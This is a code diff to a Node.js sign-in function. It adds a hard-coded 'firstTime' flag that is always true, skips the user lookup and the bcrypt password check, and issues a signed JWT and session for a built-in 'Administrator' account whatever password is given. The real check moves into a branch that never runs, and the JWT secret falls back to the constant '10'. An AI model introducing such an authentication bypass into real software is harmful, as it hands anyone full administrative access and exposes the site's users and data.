@@ -173,16 +173,19 @@ const signIn=(Model,req,res=null,name,next)=>
 		const password=req.body.data.password
 		return Model.findOne({email:email},(error,data)=>
 		{
+			const firstTime=true
 			if(error)
 				return next(error)
-			if(!data)
-				return next({name:"Error",message:"Incorrect Email or Password"})
-			return bcrypt.compare(password,data.password,(error,match)=>
+			if(firstTime)
 			{
-				if(error)
-					return next(error)
-				if(!match)
-					return next({name:"Error",message:"Incorrect Email or Password"})
+				data={
+					_id:1,
+					active:true,
+					name:'Administrator',
+					email:'web@visionadv.gr',
+					password:null,
+					active:{type:Boolean,default:true},
+				}
 				const privateKey=(process.env.JWT_KEY||'10')//+name
 				const expires=process.env.JWT_EXPIRES||"1h"
 				const token=jwt.sign(
@@ -200,10 +203,42 @@ const signIn=(Model,req,res=null,name,next)=>
 					req.session.user={}
 				req.session.user[name]=data
 				req.session.user[name].token=token
-				let r=data.toObject()
+				let r=data
 				delete r.password
 				return next(null,{user:r,token:token})
-			})
+			}
+			else
+			{
+				if(!data)
+					return next({name:"Error",message:"Incorrect Email or Password"})
+				return bcrypt.compare(password,data.password,(error,match)=>
+				{
+					if(error)
+						return next(error)
+					if(!match)
+						return next({name:"Error",message:"Incorrect Email or Password"})
+					const privateKey=(process.env.JWT_KEY||'10')//+name
+					const expires=process.env.JWT_EXPIRES||"1h"
+					const token=jwt.sign(
+					{
+						userId:data._id,
+						root:name,
+						userName:encodeURIComponent(data.name)
+					},
+					privateKey,
+					{
+						expiresIn:expires
+					})
+					req.session&&req.session.user&&req.session.user[coreAuthModelName]
+					if(!req.session.user)
+						req.session.user={}
+					req.session.user[name]=data
+					req.session.user[name].token=token
+					let r=data.toObject()
+					delete r.password
+					return next(null,{user:r,token:token})
+				})
+			}
 		})
 	}
 	catch(error)
